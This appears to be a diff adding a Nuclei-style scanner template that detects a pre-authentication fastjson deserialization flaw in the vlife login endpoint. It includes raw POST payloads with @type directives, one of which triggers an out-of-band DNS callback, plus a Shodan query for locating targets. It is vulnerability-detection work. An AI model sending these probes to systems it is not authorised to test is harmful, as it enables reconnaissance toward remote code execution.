@@ -1,0 +1,85 @@
+id: vlife-fastjson-deserialization
+
+info:
+  name: Vlife FastJSON Deserialization to RCE
+  author: omarkurt
+  severity: critical
+  description: |
+    wwwlike/vlife uses alibaba/fastjson v1.2.67 in its authentication filter
+    (MyUsernamePasswordAuthenticationFilter). The filter deserializes the raw
+    HTTP request body via JSON.parseObject() without type filtering, allowing
+    unauthenticated attackers to exploit known fastjson gadget chains for
+    Remote Code Execution. The /vlife/login endpoint processes @type directives
+    before authentication, enabling pre-auth exploitation.
+  reference:
+    - https://securitylab.github.com/advisories/GHSL-2024-300_wwwlike_vlife/
+    - https://github.com/wwwlike/vlife/pull/4
+    - https://cwe.mitre.org/data/definitions/502.html
+    - https://vulnerabletarget.com/VT-vlife
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-502
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: wwwlike
+    product: vlife
+    shodan-query: http.title:"vlife"
+  tags: vt-vlife,vlife,fastjson,deserialization,rce,unauthenticated
+
+http:
+  # Detection 1: Error-based - confirm fastjson deserialization on login endpoint
+  - raw:
+      - |
+        POST /vlife/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"@type":"java.lang.Runtime"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "com.alibaba.fastjson.JSONException"
+          - "autoType is not support"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "java.lang.Runtime"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'ParserConfig\.checkAutoType\(ParserConfig\.java:(\d+)\)'
+
+  # Detection 2: OOB - confirm actual object instantiation via DNS callback
+  - raw:
+      - |
+        POST /vlife/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - "com.alibaba.fastjson.JSONException"
